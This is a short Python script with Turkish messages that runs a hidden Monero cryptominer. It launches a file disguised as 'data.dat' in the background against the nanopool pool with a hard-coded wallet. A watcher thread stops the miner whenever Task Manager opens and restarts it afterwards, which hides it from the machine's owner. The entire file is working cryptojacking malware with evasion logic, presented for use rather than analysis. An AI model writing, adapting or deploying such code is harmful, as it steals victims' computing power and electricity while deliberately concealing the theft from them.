import os
import subprocess
import psutil
import time
import threading    

def enject():
    with open("chcekdata", "w") as f:
        f.write("True")


def start():

    print("1")
    subprocess.Popen("cmd.exe /c start /B data.dat -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("2")


def kill():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
            process.terminate()  # Programı sonlandır
            process.wait()  # Sonlanmasını bekle
            print("data.dat başarıyla durduruldu.")
            return True
    print("data.dat bulunamadı.")
    return False


def ifapp():
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'].lower() == 'data.dat':
            return True
    return False


def is_task_manager_open():
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() == "taskmgr.exe":
            return True
    return False


def task_manager_watcher():
    while True:
        if is_task_manager_open():
            print("Görev Yöneticisi Açıldı!")
            kill()
        elif not ifapp():
            subprocess.Popen("cmd.exe /c start /B data.dat -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)


task = threading.Thread(target=task_manager_watcher)
task.start()

start()


#xmrig -o xmr-eu1.nanopool.org:10300 -u CüzdanAdresiniz -p x --opencl --cuda --no-cpu